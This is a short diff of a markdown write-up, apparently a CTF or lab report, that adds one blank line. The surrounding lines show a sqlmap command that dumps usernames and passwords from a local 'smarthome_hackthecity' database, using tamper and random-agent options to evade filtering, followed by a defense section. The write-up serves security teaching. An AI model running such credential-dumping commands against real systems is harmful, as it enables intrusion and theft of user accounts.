@@ -22,6 +22,7 @@ Instead of a blind attack, I executed a structured 3-stage exploitation process 
 
 **Execution Command**
 sqlmap -u "http://localhost/Dumb/validasi.php" --data="username=test&password=test" -D smarthome_hackthecity -T tb_user -C "username,password" --dump --batch --dbs  --random-agent --tamper=space2comment
+
 <img width="522" height="184" alt="Leaked Smarthome Dump Database" src="https://github.com/user-attachments/assets/ab4e44b7-313e-4ca8-ab98-42ac52fbf455" />
 
 ## Defense Implementation
